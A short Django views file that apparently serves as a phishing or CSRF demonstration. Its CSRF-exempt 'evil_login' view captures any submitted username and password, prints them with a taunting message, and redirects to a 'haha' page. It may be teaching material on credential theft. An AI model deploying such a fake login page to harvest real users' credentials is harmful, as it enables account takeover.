from django.shortcuts import redirect, render
from django.views.decorators.csrf import csrf_exempt


@csrf_exempt
def evil_login(request):
    context = {
        'error': 'Invalid username or password',
    }

    username = request.POST.get('username')
    password = request.POST.get('password')

    if username and password:
        print("Haha! I got the password for {}: {}".format(username, password))
        return redirect('/haha')

    return render(request, 'evil_login.html', context=context)


def haha(request):
    return render(request, 'haha.html')
